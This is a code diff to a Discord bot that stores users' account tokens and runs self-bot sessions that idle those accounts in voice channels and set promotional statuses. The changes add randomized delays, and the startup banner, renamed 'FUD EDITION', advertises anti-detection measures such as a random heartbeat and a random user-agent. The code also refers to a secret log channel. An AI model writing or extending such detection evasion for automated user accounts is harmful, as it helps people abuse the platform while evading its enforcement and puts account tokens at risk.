@@ -1013,18 +1131,13 @@ class JoinServerModal(Modal, title='🎮 Sunucuya Katıl'):
 
 @bot.command()
 async def tokencontrol(ctx):
-    """💎 Token kontrol paneli"""
-   
     if not token_manager.has_tokens(ctx.author.id):
         guide_channel = bot.get_channel(TOKEN_GUIDE_CHANNEL_ID)
-        channel_mention = guide_channel.mention if guide_channel else "`#token-guide`"
+        channel_mention = guide_channel.mention if guide_channel else "#token-guide"
        
         embed = discord.Embed(
             title="❌ Token Bulunamadı",
-            description=f"Henüz hiç token eklemediniz!\n\n"
-                        f"**Token eklemek için:**\n"
-                        f"• `.tokenadd` komutunu kullanın\n"
-                        f"• Rehber için {channel_mention} kanalına bakın",
+            description=f"Henüz token eklemediniz!\n\n.tokenadd komutunu kullanın.",
             color=0xE74C3C
         )
         embed.set_thumbnail(url=ANONYMOUSDC_LOGO_URL)
@@ -1051,25 +1164,17 @@ async def tokencontrol(ctx):
    
     tokens_count = len(token_manager.get_tokens(ctx.author.id))
     selected_index = token_manager.users[user_id]['selected_token']
-   
     token_display_name = selected_token.get('name', selected_token['username'])
    
     embed.add_field(
         name="📊 Token Bilgisi",
-        value=f"**🏷️ {token_display_name}**\n"
-              f"👤 {selected_token['username']}\n"
-              f"`{selected_token['user_id_discord']}`\n"
-              f"Token `{selected_index + 1}/{tokens_count}`",
+        value=f"🏷️ {token_display_name}\n👤 {selected_token['username']}\n`{selected_token['user_id_discord']}`\nToken {selected_index + 1}/{tokens_count}",
         inline=True
     )
    
     status_emoji = "🟢" if is_active else "🔴"
     status_text = "Aktif" if is_active else "Pasif"
-    embed.add_field(
-        name="📡 Bağlantı",
-        value=f"{status_emoji} **{status_text}**",
-        inline=True
-    )
+    embed.add_field(name="📡 Bağlantı", value=f"{status_emoji} {status_text}", inline=True)
    
     if is_active and bot_key in active_bots:
         selfbot = active_bots[bot_key]
@@ -1077,11 +1182,7 @@ async def tokencontrol(ctx):
     else:
         voice_text = "❌ Bağlı Değil"
    
-    embed.add_field(
-        name="🎵 Ses Kanalı",
-        value=voice_text,
-        inline=False
-    )
+    embed.add_field(name="🎵 Ses Kanalı", value=voice_text, inline=False)
    
     mic_status = "🔴 Kapalı" if selected_token.get('mute', False) else "🟢 Açık"
     speaker_status = "🔴 Kapalı" if selected_token.get('deaf', False) else "🟢 Açık"
@@ -1100,6 +1201,7 @@ async def tokencontrol(ctx):
    
     view = ControlPanel(ctx.author.id)
     await ctx.send(embed=embed, view=view)
+
 
 class ControlPanel(View):
     def __init__(self, user_id):
@@ -1126,29 +1228,25 @@ class ControlPanel(View):
             options.append(
                 discord.SelectOption(
                     label=f"{display_name[:25]}",
-                    description=f"Token {i+1} • {token['username'][:20]}",
+                    description=f"Token {i+1}",
                     value=str(i),
                     emoji="🎮"
                 )
             )
        
-        select = Select(
-            placeholder="Token seçin...",
-            options=options[:25],
-            custom_id="token_select"
-        )
+        select = Select(placeholder="Token seçin...", options=options[:25], custom_id="token_select")
        
         async def select_callback(select_interaction: discord.Interaction):
             selected_index = int(select_interaction.data['values'][0])
             token_manager.set_selected_token(self.user_id, selected_index)
             new_token = token_manager.get_selected_token(self.user_id)
-            await select_interaction.response.send_message(f"✅ Token **{new_token.get('name', new_token['username'])}** seçildi!", ephemeral=True)
+            await select_interaction.response.send_message(f"✅ Token {new_token.get('name', new_token['username'])} seçildi!", ephemeral=True)
        
         select.callback = select_callback
         view = View()
         view.add_item(select)
        
-        await interaction.response.send_message("🎮 **Token Seçin:**", view=view, ephemeral=True)
+        await interaction.response.send_message("🎮 Token Seçin:", view=view, ephemeral=True)
    
     @discord.ui.button(label="Durum Değiştir", style=discord.ButtonStyle.primary, emoji="📝", row=0)
     async def change_status_btn(self, interaction: discord.Interaction, button: Button):
@@ -1165,19 +1263,6 @@ class ControlPanel(View):
    
     @discord.ui.button(label="Sunucuya Katıl", style=discord.ButtonStyle.success, emoji="🎮", row=0)
     async def join_server_btn(self, interaction: discord.Interaction, button: Button):
-        user_id = str(interaction.user.id)
-        selected_token = token_manager.get_selected_token(user_id)
-       
-        if not selected_token:
-            await interaction.response.send_message("❌ Token bulunamadı!", ephemeral=True)
-            return
-       
-        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
-       
-        if bot_key not in active_bots:
-            await interaction.response.send_message("❌ Token aktif değil! Önce tokeni başlatın.", ephemeral=True)
-            return
-       
         modal = JoinServerModal()
         await interaction.response.send_modal(modal)
    
@@ -1198,10 +1283,9 @@ class ControlPanel(View):
             return
        
         if await selfbot.update_voice_state(mute=False):
-            tokens = token_manager.get_tokens(user_id)
             selected_index = token_manager.users[user_id]['selected_token']
             token_manager.update_token(user_id, selected_index, mute=False)
-            await interaction.response.send_message("🎤 Mikrofon **açıldı**!", ephemeral=True)
+            await interaction.response.send_message("🎤 Mikrofon açıldı!", ephemeral=True)
         else:
             await interaction.response.send_message("❌ Mikrofon açılamadı!", ephemeral=True)
    
@@ -1222,10 +1306,9 @@ class ControlPanel(View):
             return
        
         if await selfbot.update_voice_state(mute=True):
-            tokens = token_manager.get_tokens(user_id)
             selected_index = token_manager.users[user_id]['selected_token']
             token_manager.update_token(user_id, selected_index, mute=True)
-            await interaction.response.send_message("🎤 Mikrofon **kapatıldı**!", ephemeral=True)
+            await interaction.response.send_message("🎤 Mikrofon kapatıldı!", ephemeral=True)
         else:
             await interaction.response.send_message("❌ Mikrofon kapatılamadı!", ephemeral=True)
    
@@ -1246,10 +1329,9 @@ class ControlPanel(View):
             return
        
         if await selfbot.update_voice_state(deaf=False):
-            tokens = token_manager.get_tokens(user_id)
             selected_index = token_manager.users[user_id]['selected_token']
             token_manager.update_token(user_id, selected_index, deaf=False)
-            await interaction.response.send_message("🔊 Kulaklık **açıldı**!", ephemeral=True)
+            await interaction.response.send_message("🔊 Kulaklık açıldı!", ephemeral=True)
         else:
             await interaction.response.send_message("❌ Kulaklık açılamadı!", ephemeral=True)
    
@@ -1270,23 +1352,14 @@ class ControlPanel(View):
             return
        
         if await selfbot.update_voice_state(deaf=True):
-            tokens = token_manager.get_tokens(user_id)
             selected_index = token_manager.users[user_id]['selected_token']
             token_manager.update_token(user_id, selected_index, deaf=True)
-            await interaction.response.send_message("🔊 Kulaklık **kapatıldı**!", ephemeral=True)
+            await interaction.response.send_message("🔊 Kulaklık kapatıldı!", ephemeral=True)
         else:
             await interaction.response.send_message("❌ Kulaklık kapatılamadı!", ephemeral=True)
    
     @discord.ui.button(label="Kanal Değiştir", style=discord.ButtonStyle.primary, emoji="🔄", row=3)
     async def change_channel_btn(self, interaction: discord.Interaction, button: Button):
-        user_id = str(interaction.user.id)
-        selected_token = token_manager.get_selected_token(user_id)
-        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
-       
-        if bot_key not in active_bots:
-            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
-            return
-       
         modal = ChannelModal()
         await interaction.response.send_modal(modal)
    
@@ -1324,6 +1397,8 @@ class ControlPanel(View):
             del active_bots[bot_key]
        
         try:
+            await asyncio.sleep(random.uniform(1, 3))
+            
             use_spotify = selected_token.get('use_spotify', True)
             selfbot = SelfBot(
                 selected_token['token'],
@@ -1334,9 +1409,9 @@ class ControlPanel(View):
            
             active_bots[bot_key] = selfbot
            
-            await asyncio.sleep(2)
+            await asyncio.sleep(random.uniform(2, 3))
            
-            result = "♻️ **Bot Yeniden Başlatıldı!**\n\n"
+            result = "♻️ Bot Yeniden Başlatıldı!\n\n"
            
             if selected_token.get('channel_id'):
                 success, channel_name = await selfbot.join_voice(
@@ -1345,7 +1420,7 @@ class ControlPanel(View):
                     selected_token.get('deaf', False)
                 )
                 if success:
-                    result += f"✅ **{channel_name}** kanalına katıldı!"
+                    result += f"✅ {channel_name} kanalına katıldı!"
                 else:
                     result += f"⚠️ Kanala katılamadı: {channel_name}"
             else:
@@ -1353,7 +1428,7 @@ class ControlPanel(View):
            
             await interaction.followup.send(result, ephemeral=True)
         except Exception as e:
-            await interaction.followup.send(f"❌ Hata:\n```{str(e)}```", ephemeral=True)
+            await interaction.followup.send(f"❌ Hata: {str(e)}", ephemeral=True)
    
     @discord.ui.button(label="Yenile", style=discord.ButtonStyle.secondary, emoji="🔄", row=4)
     async def refresh_btn(self, interaction: discord.Interaction, button: Button):
@@ -1382,18 +1457,13 @@ class ControlPanel(View):
        
         embed.add_field(
             name="📊 Token Bilgisi",
-            value=f"**🏷️ {token_display_name}**\n"
-                  f"👤 {selected_token['username']}\n"
-                  f"`{selected_token['user_id_discord']}`\n"
-                  f"Token `{selected_index + 1}/{tokens_count}`",
+            value=f"🏷️ {token_display_name}\n👤 {selected_token['username']}\n`{selected_token['user_id_discord']}`\nToken {selected_index + 1}/{tokens_count}",
             inline=True
         )
        
-        status_emoji = "🟢" if is_active else "🔴"
-        status_text = "Aktif" if is_active else "Pasif"
         embed.add_field(
             name="📡 Bağlantı",
-            value=f"{status_emoji} **{status_text}**",
+            value=f"{'🟢 Aktif' if is_active else '🔴 Pasif'}",
             inline=True
         )
        
@@ -1403,11 +1473,7 @@ class ControlPanel(View):
         else:
             voice_text = "❌ Bağlı Değil"
        
-        embed.add_field(
-            name="🎵 Ses Kanalı",
-            value=voice_text,
-            inline=False
-        )
+        embed.add_field(name="🎵 Ses Kanalı", value=voice_text, inline=False)
        
         mic_status = "🔴 Kapalı" if selected_token.get('mute', False) else "🟢 Açık"
         speaker_status = "🔴 Kapalı" if selected_token.get('deaf', False) else "🟢 Açık"
@@ -1455,10 +1521,8 @@ class ControlPanel(View):
             )
        
         token_manager.remove_token(interaction.user.id, selected_index)
-        await interaction.response.send_message(
-            "🗑️ **Token Silindi!**\n\n⚠️ Token verileri kalıcı olarak silindi.",
-            ephemeral=True
-        )
+        await interaction.response.send_message("🗑️ Token Silindi!", ephemeral=True)
+
 
 class ChannelModal(Modal, title='🔄 Kanal Değiştir'):
     channel_input = TextInput(
@@ -1483,6 +1547,7 @@ class ChannelModal(Modal, title='🔄 Kanal Değiştir'):
        
         selfbot = active_bots[bot_key]
        
+        await asyncio.sleep(random.uniform(0.5, 1))
         success, info = await selfbot.join_voice(
             channel_id,
             selected_token.get('mute', False),
@@ -1492,9 +1557,10 @@ class ChannelModal(Modal, title='🔄 Kanal Değiştir'):
         if success:
             selected_index = token_manager.users[user_id]['selected_token']
             token_manager.update_token(interaction.user.id, selected_index, channel_id=channel_id)
-            await interaction.followup.send(f"✅ **{info}** kanalına taşındı!", ephemeral=True)
+            await interaction.followup.send(f"✅ {info} kanalına taşındı!", ephemeral=True)
         else:
             await interaction.followup.send(f"❌ Hata: {info}", ephemeral=True)
+
 
 class StatusModal(Modal, title='📝 Durum Değiştir'):
     status_text_input = TextInput(
@@ -1542,13 +1608,13 @@ class StatusModal(Modal, title='📝 Durum Değiştir'):
         if await selfbot.update_status(status_text=status_text, custom_status=custom_status, custom_emoji=custom_emoji):
             selected_index = token_manager.users[user_id]['selected_token']
             token_manager.update_token(user_id, selected_index, status_text=status_text, custom_status=custom_status, custom_emoji=custom_emoji)
-            await interaction.followup.send(f"✅ Durum değiştirildi: {custom_status} {custom_emoji} • **discord.gg/anonymousdc** oynuyor", ephemeral=True)
+            await interaction.followup.send(f"✅ Durum değiştirildi: {custom_status} {custom_emoji} • discord.gg/anonymousdc oynuyor", ephemeral=True)
         else:
             await interaction.followup.send("❌ Durum değiştirilemedi!", ephemeral=True)
 
+
 @tasks.loop(minutes=5)
 async def check_tokens_health():
-    """Her 5 dakikada bir tokenları kontrol et"""
     print("🔍 Token sağlık kontrolü başlatılıyor...")
    
     for user_id, user_data in list(token_manager.users.items()):
@@ -1564,14 +1630,15 @@ async def check_tokens_health():
                         await selfbot._reconnect()
                     except:
                         pass
+           
+            await asyncio.sleep(random.uniform(0.5, 1.5))
    
     print("✅ Token sağlık kontrolü tamamlandı!")
 
 
 async def start_all_tokens_to_voice():
-    """Bot açıldığında tüm kayıtlı tokenleri kayıtlı ses kanallarına bağlar (Spotify AnonymousDC ile)."""
-    # Discord rate limit / connection reset önlemek için tokenlar arası bekleme (saniye)
-    DELAY_BETWEEN_TOKENS = 5
+    DELAY_BETWEEN_TOKENS = random.uniform(5, 10)  # Rastgele bekleme süresi
+    
     for user_id, user_data in list(token_manager.users.items()):
         for token_data in user_data['tokens']:
             channel_id = token_data.get('channel_id')
@@ -1582,6 +1649,8 @@ async def start_all_tokens_to_voice():
                 continue
             selfbot = None
             try:
+                await asyncio.sleep(random.uniform(2, 5))
+                
                 use_spotify = token_data.get('use_spotify', True)
                 selfbot = SelfBot(
                     token_data['token'],
@@ -1589,7 +1658,7 @@ async def start_all_tokens_to_voice():
                     use_spotify=use_spotify
                 )
                 await selfbot.connect()
-                await asyncio.sleep(2)
+                await asyncio.sleep(random.uniform(2, 4))
                 success, _ = await selfbot.join_voice(
                     channel_id,
                     token_data.get('mute', False),
@@ -1607,25 +1676,27 @@ async def start_all_tokens_to_voice():
                         await selfbot.disconnect()
                     except Exception:
                         pass
+            
             await asyncio.sleep(DELAY_BETWEEN_TOKENS)
+
 
 if __name__ == "__main__":
     try:
         os.system('cls' if os.name == 'nt' else 'clear')
         print('═' * 70)
-        print('💎 ANONYMOUSDC AFK BOT')
+        print('💎 ANONYMOUSDC AFK BOT - FUD EDITION')
         print('═' * 70)
         print('made by recyla')
         print('═' * 70)
-        print('\n🔐 ÖNEMLİ: GİZLİ AYARLARI YAPIN:')
-        print(f' • SECRET_LOG_CHANNEL_ID = {SECRET_LOG_CHANNEL_ID}')
-        print(f' • TOKEN_REGISTER_CHANNEL_ID = {TOKEN_REGISTER_CHANNEL_ID}')
-        print(f' • TOKEN_GUIDE_CHANNEL_ID = {TOKEN_GUIDE_CHANNEL_ID}')
-        print(f'\n👑 YETKİLİ KULLANICI ID\'LERİNİ AYARLAYIN!')
-        print(f' • Şu an {len(AUTHORIZED_USERS)} yetkili tanımlı')
-        print('\n🚀 Bot başlatılıyor...\n')
+        print('\n🔐 Anti-Detection Aktif:')
+        print(' • Rastgele Heartbeat (40-43 sn)')
+        print(' • Rastgele User-Agent')
+        print(' • Random Delays')
+        print(' • Exponential Backoff')
+        print('═' * 70)
+        print(f'\n👑 Yetkili: {len(AUTHORIZED_USERS)} kişi')
+        print('🚀 Bot başlatılıyor...\n')
         
-        # BOT_TOKEN artık en üstte tanımlandı
         bot.run(BOT_TOKEN)
     except KeyboardInterrupt:
         print('\n👋 Bot kapatılıyor...')
@@ -1633,4 +1704,3 @@ if __name__ == "__main__":
         print(f'\n❌ HATA: {e}')
         import traceback
         traceback.print_exc()
-        input('\n\nÇıkmak için Enter tuşuna basın...')
